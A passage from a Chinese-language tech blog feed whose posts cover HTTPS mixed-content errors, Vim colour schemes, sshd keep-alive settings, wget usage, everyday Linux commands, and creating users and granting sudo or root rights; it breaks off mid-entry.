    <content type="html"><![CDATA[<p>最近需要将项目迁移至一台新的服务器，其中涉及到多个站点的<code>http</code>与<code>https</code>之间的转换。</p><p>网站起初不能正常访问时，我没在意，以为是网络延迟（因为服务器放在国外），直到我打开控制台发现了如下异常：</p><a id="more"></a><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200718144533.png" alt="异常内容"></p><p>这时我才意识到并不是网络延迟的问题，而是项目没有配置好。</p><h2 id="什么是混合内容"><a href="#什么是混合内容" class="headerlink" title="什么是混合内容"></a>什么是混合内容</h2><blockquote><p>当用户访问使用HTTPS的页面时，他们与web服务器之间的连接是使用SSL加密的，从而保护连接不受嗅探器和中间人攻击。<br>如果HTTPS页面包括由普通明文HTTP连接加密的内容，那么连接只是被部分加密：非加密的内容可以被嗅探者入侵，并且可以被中间人攻击者修改，因此连接不再受到保护。当一个网页出现这种情况时，它被称为混合内容页面。 —— <a href="https://developer.mozilla.org/zh-CN/docs/Security/MixedContent" target="_blank" rel="noopener">MDN</a></p></blockquote><p>通俗一点解释就是：<code>https</code> 的页面中混合着<code>http</code> 的请求，而这种请求不会被浏览器正常接受的，也被称作为混合内容页面。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>既然已经明白了为什么会产生这个问题，那么要解决起来也就非常简单了。</p><h3 id="让Firefox暂时不阻止"><a href="#让Firefox暂时不阻止" class="headerlink" title="让Firefox暂时不阻止"></a>让Firefox暂时不阻止</h3><ol><li>打开新标签页，在地址栏输入 <code>about:config</code>，进入<code>FireFox</code>高级配置页面。</li><li>搜索<code>security.mixed_content.block_active_content</code>，将默认值<code>true</code>更改为<code>false</code>。</li></ol><p>这种方式仅适用于本地调试。</p><h3 id="避免在HTTPS页面中包含HTTP的内容"><a href="#避免在HTTPS页面中包含HTTP的内容" class="headerlink" title="避免在HTTPS页面中包含HTTP的内容"></a>避免在HTTPS页面中包含HTTP的内容</h3><p>更直接有效的方式应该是约定好项目中的协议，统一使用<code>https</code>或者<code>http</code>。</p><h3 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h3><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Security/MixedContent" target="_blank" rel="noopener">什么是混合内容——MDN</a></li><li><a href="https://segmentfault.com/a/1190000015722535" target="_blank" rel="noopener">https访问遇到“已阻止载入混合内容”</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近需要将项目迁移至一台新的服务器，其中涉及到多个站点的&lt;code&gt;http&lt;/code&gt;与&lt;code&gt;https&lt;/code&gt;之间的转换。&lt;/p&gt;
&lt;p&gt;网站起初不能正常访问时，我没在意，以为是网络延迟（因为服务器放在国外），直到我打开控制台发现了如下异常：&lt;/p&gt;</summary>
    
    
    
    <category term="一些经验" scheme="https://www.0x2beace.com/categories/%E4%B8%80%E4%BA%9B%E7%BB%8F%E9%AA%8C/"/>
    
    
    <category term="https" scheme="https://www.0x2beace.com/tags/https/"/>
    
  </entry>
  
  <entry>
    <title>Vim 安装 molokai 配色方案</title>
    <link href="https://www.0x2beace.com/vim-install-molokai-color-scheme/"/>
    <id>https://www.0x2beace.com/vim-install-molokai-color-scheme/</id>
    <published>2020-07-18T06:36:04.000Z</published>
    <updated>2020-07-18T06:38:53.741Z</updated>
    
    <content type="html"><![CDATA[<p>像<a href="https://github.com/altercation/solarized" target="_blank" rel="noopener">solarized</a>、<a href="https://github.com/morhetz/gruvbox" target="_blank" rel="noopener">gruvbox</a>、 <a href="https://github.com/tomasr/molokai" target="_blank" rel="noopener">molokai</a>、这些都是大名鼎鼎的VIM 配色方案，本文只介绍如何安装 <code>molokai</code> 。</p><a id="more"></a><p>按照顺序执行完上面的命令，即可使用最经典的配色方案了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">mkdir .vim &amp;&amp; cd .vim</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;tomasr&#x2F;molokai.git</span><br><span class="line">cp -rf molokai&#x2F;colors&#x2F; .&#x2F;colors</span><br><span class="line">echo colorscheme molokai &gt;&gt; ~&#x2F;.vimrc</span><br><span class="line">echo set t_Co&#x3D;256 &gt;&gt; ~&#x2F;.vimrc</span><br><span class="line">echo set background&#x3D;dark  &gt;&gt; ~&#x2F;.vimrc</span><br></pre></td></tr></table></figure><p>实际效果：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200718142924.png" alt=""></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;像&lt;a href=&quot;https://github.com/altercation/solarized&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;solarized&lt;/a&gt;、&lt;a href=&quot;https://github.com/morhetz/gruvbox&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;gruvbox&lt;/a&gt;、 &lt;a href=&quot;https://github.com/tomasr/molokai&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;molokai&lt;/a&gt;、这些都是大名鼎鼎的VIM 配色方案，本文只介绍如何安装 &lt;code&gt;molokai&lt;/code&gt; 。&lt;/p&gt;</summary>
    
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/categories/Tutorial/"/>
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/tags/Tutorial/"/>
    
    <category term="Vim" scheme="https://www.0x2beace.com/tags/Vim/"/>
    
  </entry>
  
  <entry>
    <title>sshd_config 常用配置项</title>
    <link href="https://www.0x2beace.com/sshd-config-common-configuration-items/"/>
    <id>https://www.0x2beace.com/sshd-config-common-configuration-items/</id>
    <published>2020-07-17T15:17:09.000Z</published>
    <updated>2020-07-17T15:18:28.234Z</updated>
    
    <content type="html"><![CDATA[<p>这篇笔记用来收录那些常用的<code>sshd_config</code>配置项。</p><a id="more"></a><h3 id="保持链接"><a href="#保持链接" class="headerlink" title="保持链接"></a>保持链接</h3><p>保持客户端与服务端之间的连接保持活动状态似乎是最常见策略。</p><ul><li><code>ServerAliveInterval</code>：客户端在向服务器发送空数据包之前（等待连接保持活动状态）将等待的秒数。</li><li><code>ClientAliveInterval</code>：服务器在向客户端发送空数据包之前（等待连接保持活动状态）将等待的秒数。</li></ul><p>设置为0（默认值）将禁用这些功能，因此如果空闲时间太长，连接可能会断开。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Host myhostshortcut</span><br><span class="line">     HostName myhost.com</span><br><span class="line">     User barthelemy</span><br><span class="line">     ServerAliveInterval 60</span><br><span class="line">     ServerAliveCountMax 10</span><br></pre></td></tr></table></figure><p>这么设置的作用是：客户端将等待空闲60秒钟（<code>ServerAliveInterval</code>时间），然后向服务器发送 <code>no-op null</code>数据包，并期待响应。</p><p>如果没有响应，则它将继续尝试上述过程直到10次（ServerAliveCountMax 次数 10 * 60 = 600秒）。如果服务器仍然没有响应，则客户端将断开ssh连接。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://unix.stackexchange.com/questions/3026/what-options-serveraliveinterval-and-clientaliveinterval-in-sshd-config-exac" target="_blank" rel="noopener">如何让ssh客户端与服务端保持连接</a></li><li><a href="https://linux.die.net/man/5/sshd_config" target="_blank" rel="noopener">sshd_config 参考手册</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;这篇笔记用来收录那些常用的&lt;code&gt;sshd_config&lt;/code&gt;配置项。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    <category term="命令整理" scheme="https://www.0x2beace.com/categories/Linux/%E5%91%BD%E4%BB%A4%E6%95%B4%E7%90%86/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
    <category term="ssh" scheme="https://www.0x2beace.com/tags/ssh/"/>
    
  </entry>
  
  <entry>
    <title>Wget 使用技巧</title>
    <link href="https://www.0x2beace.com/wget-tips/"/>
    <id>https://www.0x2beace.com/wget-tips/</id>
    <published>2020-07-16T15:30:39.000Z</published>
    <updated>2020-07-16T15:31:23.790Z</updated>
    
    <content type="html"><![CDATA[<p><code>wget</code> 是一个命令行的下载工具，对于经常使用<code>Linux</code>的用户来说，真是再熟悉不过了。下面总结了一些实用的<code>wget</code>使用技巧，可能会让你更加高效地使用 <code>wget</code>。</p><a id="more"></a><h3 id="重命名"><a href="#重命名" class="headerlink" title="重命名"></a>重命名</h3><p>最常见的使用方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget http:&#x2F;&#x2F;example.com&#x2F;filename.txt</span><br></pre></td></tr></table></figure><p>wget默认会以最后一个符合 <code>/</code> 的后面的字符来对下载文件命名，对于动态链接的下载通常文件名会不正确。</p><p>如果希望对这个下载的文件进行重命名，我们可以使用参数 <code>-O</code> 来指定一个文件名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget -O file.zip http:&#x2F;&#x2F;example.com&#x2F;filename.txt</span><br></pre></td></tr></table></figure><h3 id="后台下载"><a href="#后台下载" class="headerlink" title="后台下载"></a>后台下载</h3><p>当需要下载比较大的文件时，使用参数 <code>-b</code> 可以隐藏在后台进行下载：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget -b http:&#x2F;&#x2F;wppkg.baidupcs.com&#x2F;issue&#x2F;netdisk&#x2F;MACguanjia&#x2F;BaiduNetdisk_mac_3.2.0.9.dmg</span><br></pre></td></tr></table></figure><p>然后可以使用以下命令查看当前的进度：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tail -f wget-log</span><br></pre></td></tr></table></figure><h3 id="下载目录"><a href="#下载目录" class="headerlink" title="下载目录"></a>下载目录</h3><p>这条命令可以下载 <a href="http://example.com" target="_blank" rel="noopener">http://example.com</a> 网站上 packages 目录中的所有文件。</p><p>参数说明：</p><ul><li><code>-r</code>：下载目录</li><li><code>-np</code>：不遍历父目录</li><li><code>-nd</code>：不在本机重新创建目录结构</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget -r -np -nd http:&#x2F;&#x2F;example.com&#x2F;packages&#x2F;</span><br></pre></td></tr></table></figure><p>与上一条命令相似，但多加了一个 <code>--accept=iso</code> 选项，这指示 wget 仅下载 i386 目录中所有扩展名为 iso 的文件。你也可以指定多个扩展名，只需用逗号分隔即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget -r -np -nd --accept&#x3D;iso http:&#x2F;&#x2F;example.com&#x2F;centos-5&#x2F;i386&#x2F;</span><br></pre></td></tr></table></figure><h3 id="批量下载"><a href="#批量下载" class="headerlink" title="批量下载"></a>批量下载</h3><p>此命令常用于批量下载的情形，把所有需要下载文件的地址放到 filename.txt 中，然后 wget 就会自动为你下载所有文件了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget -i filename.txt</span><br></pre></td></tr></table></figure><h3 id="断点续传"><a href="#断点续传" class="headerlink" title="断点续传"></a>断点续传</h3><p>通常我们在下载大文件时，为了防止中途因为网络不稳定等因素所引起的下载失败，可以使用 <code>-c</code> 参数，作为断点续传。</p><p>好处是：如果当时下载失败了，之后再次下载该文件时，会继续上一次的下载，而不用重头下载了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget -c http:&#x2F;&#x2F;example.com&#x2F;really-big-file.iso</span><br></pre></td></tr></table></figure><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>该命令可用来镜像一个网站，wget 将对链接进行转换。如果网站中的图像是放在另外的站点，那么可以使用 -H 选项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget -m -k (-H) http:&#x2F;&#x2F;www.example.com&#x2F;</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://linuxtoy.org/archives/wget-tips.html" target="_blank" rel="noopener">wget 使用技巧</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;code&gt;wget&lt;/code&gt; 是一个命令行的下载工具，对于经常使用&lt;code&gt;Linux&lt;/code&gt;的用户来说，真是再熟悉不过了。下面总结了一些实用的&lt;code&gt;wget&lt;/code&gt;使用技巧，可能会让你更加高效地使用 &lt;code&gt;wget&lt;/code&gt;。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    <category term="命令整理" scheme="https://www.0x2beace.com/categories/Linux/%E5%91%BD%E4%BB%A4%E6%95%B4%E7%90%86/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>一些实用的 Linux 命令</title>
    <link href="https://www.0x2beace.com/some-practical-linux-commands/"/>
    <id>https://www.0x2beace.com/some-practical-linux-commands/</id>
    <published>2020-07-16T15:26:13.000Z</published>
    <updated>2020-09-05T02:10:46.310Z</updated>
    
    <content type="html"><![CDATA[<p>这篇笔记的目的是用来整理那些不常用但又很实用的Linux 命令。</p><a id="more"></a><h3 id="sudo"><a href="#sudo" class="headerlink" title="sudo !!"></a>sudo !!</h3><p>有时候我们好不容易输完一长串命令，却被提示”权限不足”，如果这个时候有一个命令记住上一次的输入内容那该多好。</p><p>还真有，<code>!!</code>命令可以获取最后一次输入的命令，所以我们直接输入下面这个命令就可以了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo !!</span><br></pre></td></tr></table></figure><p>注意中间有一个空格。</p><h3 id="nl"><a href="#nl" class="headerlink" title="nl"></a>nl</h3><p><code>nl</code> 命令类似<code>cat</code>命令，都是查看文件内容，但不同之处在于：<code>nl</code>命令会在文本内容的每一行前面，添加行号。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ cat test.txt</span><br><span class="line">boo</span><br><span class="line">mac</span><br><span class="line">$ nl test.txt</span><br><span class="line">1. boo</span><br><span class="line">2. mac</span><br></pre></td></tr></table></figure><h3 id="tree"><a href="#tree" class="headerlink" title="tree"></a>tree</h3><p>以树状的形式返回当前目录的文件夹结构，这个命令很好用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ tree </span><br><span class="line">.</span><br><span class="line">└── test.txt</span><br><span class="line"></span><br><span class="line">0 directories, 1 file</span><br></pre></td></tr></table></figure><h3 id="pstree"><a href="#pstree" class="headerlink" title="pstree"></a>pstree</h3><p>和<code>tree</code>类似，不过它是返回当前运行的所有进程及其相关的子进程的树状结构。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ pstree | grep php</span><br><span class="line">|-+&#x3D; 01365 boo nginx: master process &#x2F;usr&#x2F;local&#x2F;opt&#x2F;nginx&#x2F;bin&#x2F;nginx -g daemon off;</span><br><span class="line"> | \--- 01410 boo nginx: worker process</span><br><span class="line"> | |     \--- 73098 boo grep --color&#x3D;auto nginx</span><br></pre></td></tr></table></figure><h3 id="dig"><a href="#dig" class="headerlink" title="dig"></a>dig</h3><p>这个命令特别实用，可以用来查看域名解析情况。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">dig 0x2BeAce.com +nostats +nocomments +nocmd</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; 0x2BeAce.com +nostats +nocomments +nocmd</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;0x2BeAce.com.INA</span><br><span class="line">0x2BeAce.com.3581INA185.199.108.153</span><br><span class="line">0x2BeAce.com.3581INA185.199.110.153</span><br><span class="line">0x2BeAce.com.3581INA185.199.111.153</span><br><span class="line">0x2BeAce.com.3581INA185.199.109.153</span><br><span class="line">0x2BeAce.com.3581INNSns12.domaincontrol.com.</span><br><span class="line">0x2BeAce.com.3581INNSns11.domaincontrol.com.</span><br><span class="line">ns12.domaincontrol.com.59833INA173.201.73.6</span><br><span class="line">ns11.domaincontrol.com.92984INA97.74.105.6</span><br><span class="line">ns12.domaincontrol.com.146699INAAAA2603:5:2290::6</span><br><span class="line">ns11.domaincontrol.com.92042INAAAA2603:5:2190::6</span><br></pre></td></tr></table></figure><h3 id="lt-空格-gt-命令"><a href="#lt-空格-gt-命令" class="headerlink" title="&lt;空格&gt; 命令"></a>&lt;空格&gt; 命令</h3><p>这是一个有趣的命令，总所周知，用户在终端上键入的每一个命令都会被记录到<code>history</code>中，那么有没有一个命令可以骗过<code>history</code>，而不被记入呢？答案是有的。</p><p>在终端，只需要在键入命令之前输入一个或多个空格，这样你的命令就不会被记录了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ hisotry</span><br><span class="line">8874  pstree | grep nginx</span><br><span class="line">$  date</span><br><span class="line">2020年 5月18日 星期一 21时09分03秒 CST</span><br><span class="line">$ history</span><br><span class="line">8874  pstree | grep nginx</span><br></pre></td></tr></table></figure><h3 id="一些其他命令"><a href="#一些其他命令" class="headerlink" title="一些其他命令"></a>一些其他命令</h3><p>查看系统信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ uname -a</span><br></pre></td></tr></table></figure><p>查找发行版信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ lsb_release -a</span><br></pre></td></tr></table></figure><p>查看当前日期</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ date</span><br></pre></td></tr></table></figure><p>立即关机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ shutdown -h now</span><br></pre></td></tr></table></figure><p>重新启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ reboot</span><br></pre></td></tr></table></figure><p>输出文件类型信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file test.txt</span><br><span class="line">test.txt: ASCII text</span><br></pre></td></tr></table></figure><p>在终端中进行简单的算数运算</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ expr 1 + 3</span><br><span class="line">4</span><br></pre></td></tr></table></figure><p>重命名文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ mv fileA.txt fileB.txt</span><br><span class="line">$ ls</span><br><span class="line">fileB.txt</span><br></pre></td></tr></table></figure><p>nohup 是一个 <code>POSIX</code> 命令，用于忽略 <code>SIGHUP</code> 。 SIGHUP信号是終端注销时所发送至程序的一个信号。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohub php script.php</span><br></pre></td></tr></table></figure><p>type 命令用来显示指定命令的类型，判断给出的指令是内部指令还是外部指令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">type -a php</span><br><span class="line">php is &#x2F;usr&#x2F;local&#x2F;bin&#x2F;php</span><br><span class="line">php is &#x2F;usr&#x2F;bin&#x2F;php</span><br></pre></td></tr></table></figure><p>命令类型：</p><ul><li>alias：别名。</li><li>keyword：关键字，Shell保留字。</li><li>function：函数，Shell函数。</li><li>builtin：内建命令，Shell内建命令。</li><li>file：文件，磁盘文件，外部命令。</li><li>unfound：没有找到。</li></ul><p>查找进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -aux | grep php</span><br></pre></td></tr></table></figure><p>注意：每个操作系统的ps版本略有不同，Ubuntu 和Mac 上可以直接使用<code>-aux</code>参数，但可能其他系统不能加破折号。<br>参考链接：<a href="https://www.computerhope.com/unix/ups.htm" target="_blank" rel="noopener">Linux ps command help and example</a></p><p>杀死进程</p><ol><li>根据 <code>pid</code>（会杀死指定pid 的进程）</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill -9 [pid]</span><br></pre></td></tr></table></figure><ol start="2"><li>根据进程名称（会杀死一组同名进程）</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">killall php</span><br></pre></td></tr></table></figure><h3 id="全局根据文件名查找文件具体路径"><a href="#全局根据文件名查找文件具体路径" class="headerlink" title="全局根据文件名查找文件具体路径"></a>全局根据文件名查找文件具体路径</h3><p>有时候很想找到某个文件，但是又不记得具体路径了，这时可以使用 <code>find</code> 命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -name &lt;file name&gt;</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://blog.csdn.net/zhu_xun/article/details/17018799" target="_blank" rel="noopener">鲜为人知而又实用的 Linux 命令</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;这篇笔记的目的是用来整理那些不常用但又很实用的Linux 命令。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    <category term="命令整理" scheme="https://www.0x2beace.com/categories/Linux/%E5%91%BD%E4%BB%A4%E6%95%B4%E7%90%86/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Linux 添加用户以及权限分配</title>
    <link href="https://www.0x2beace.com/linux-add-users-and-assign-permissions/"/>
    <id>https://www.0x2beace.com/linux-add-users-and-assign-permissions/</id>
    <published>2020-07-15T15:19:14.000Z</published>
    <updated>2020-07-16T15:29:23.772Z</updated>
    
    <content type="html"><![CDATA[<p>写这篇笔记的目的是：在 Linux 下经常为用户的权限问题而头疼，要么是权限不足，要么是权限太大，导致结果往往不是自己想要的。</p><p>另外还有一个促使我写这篇笔记的原因就是：之前在 本地的 Ubuntu 上，竟然把用户玩坏了… 为了避免这种事情在服务器上发生，还是得深入研究下这一块。</p><a id="more"></a><h2 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h2><p>在 Linux 上，添加用户有两种方式：<code>useradd</code>和<code>adduser</code>，其区别就是：</p><ul><li>useradd 是一个Linux 命令，它提供很多参数给用户根据自己的需要进行设置。</li><li>adduser 则是一个perl 脚本，在使用时通过简单的人机交互界面，供用户进行个性设置。</li></ul><h3 id="adduser"><a href="#adduser" class="headerlink" title="adduser"></a>adduser</h3><p>相比 useradd，adduser的使用要简单很多。</p><p>使用adduser 添加一个用户：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ adduser boo</span><br></pre></td></tr></table></figure><p>然后根据提示填写相应的内容，需要注意的是，该命令会自动的在 <code>/home</code> 目录下创建一个与用户同名的目录。</p><p>用 adduser 这个命令创建的账号是系统账号，可以用来登录到 ubuntu系统。</p><h3 id="useradd"><a href="#useradd" class="headerlink" title="useradd"></a>useradd</h3><p>useradd 命令有大量的参数供我们进行个性设置，常用参数如下：</p><ul><li>-d&lt;登入目录&gt;：指定用户登入时的启始目录，并赋予用户对该目录的的完全控制权</li><li>-g&lt;群组&gt;：指定用户所属的群组；</li><li>-G&lt;群组&gt;：指定用户所属的附加群组；</li><li>-m：在 /home 目录下自动建立用户的登入目录；</li><li>-r：建立系统帐号；</li><li>-s<shell>：指定用户登入后所使用的shell；</li><li>-u<uid>：指定用户的 id</li></ul><p>使用 useradd 创建用户的一般步骤如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ useradd -m boo -s &#x2F;bin&#x2F;bash</span><br><span class="line">$ passwd boo</span><br><span class="line">$ ls &#x2F;home&#x2F;</span><br><span class="line">boo</span><br></pre></td></tr></table></figure><p>其中要注意的有：</p><ol><li>useradd 命令如果不带任何参数（useradd boo），表示只是创建一个用户，既没有 /home 目录下的同名文件夹，也没有设置密码，但是可以在 /etc/passwd 文件的最后一行看到刚才添加的用户。</li><li>useradd <del>这个命令创建的是普通账号，并不能用来登录系统</del>。加上参数<code>-r</code>，将该用户加入到系统用户，系统用户为 id在 1000以下的用户，而普通用户则是id 在 1000以上。事实证明 无论是普通用户还是系统用户 只要密码输入正确都能登入系统。</li><li>当使用参数<code>-m</code>的时候，系统会自动地在 /home 目录下建立一个与新建用户同名的用户主文件夹；如果不使用<code>-m</code>的话，那么就默认是使用<code>-M</code>参数，不创建主文件夹，即使你使用了<code>-d</code>这个参数。所以如果想要自己选择主文件夹，需要同时加上<code>-m</code>和<code>-d</code>参数。</li><li>误区：很都时候刚拿到一台新的机器，会发现用户目录下只有一个当前用户的文件夹，不要误以为该系统只有你一个用户，是因为很多系统用户的主目录并不在 /home 下。</li></ol><h2 id="权限分配"><a href="#权限分配" class="headerlink" title="权限分配"></a>权限分配</h2><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>无论是使用 adduser 还是 useradd 创建的用户，都试着执行一下以下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install vim</span><br></pre></td></tr></table></figure><p>不出意外，你肯定会得到这样一个错误：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[sudo] password for boo:</span><br><span class="line">boo is not in the sudoers file.  This incident will be reported.</span><br></pre></td></tr></table></figure><p>这个错误的意思是说该用户并不在 sudoers 文件中，那么该如何解决呢？</p><p>使用如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ sudo visudo</span><br><span class="line"></span><br><span class="line"># Members of the admin group may gain root privileges</span><br><span class="line">%admin ALL&#x3D;(ALL) ALL</span><br><span class="line"></span><br><span class="line"># 找到该注释，在其下增加一行 </span><br><span class="line">%yourusername ALL&#x3D;(ALL) ALL</span><br></pre></td></tr></table></figure><p>然后保存退出，就会发现可以使用 sudo 提权了。</p><h3 id="赋予-root-权限"><a href="#赋予-root-权限" class="headerlink" title="赋予 root 权限"></a>赋予 root 权限</h3><p>这里有三种方式，先来看看最简单的方式：</p><p>方式一：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo vim &#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line"># 将用户id 改为 0</span><br><span class="line">testuser1:x:0:1001::&#x2F;home&#x2F;testuser1:&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure><p>需要注意的是：</p><ol><li>该方法适用于普通用户以及管理员用户</li><li>使用 testuser1 账户登录后，直接获取的就是 root 帐号的权限。</li></ol><p>方式二：（这里以ubuntu 系统为例）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ sudo visudo # sudo vim &#x2F;etc&#x2F;sudoers</span><br><span class="line"></span><br><span class="line">#  Allow members of group sudo to execute any command</span><br><span class="line">%sudo   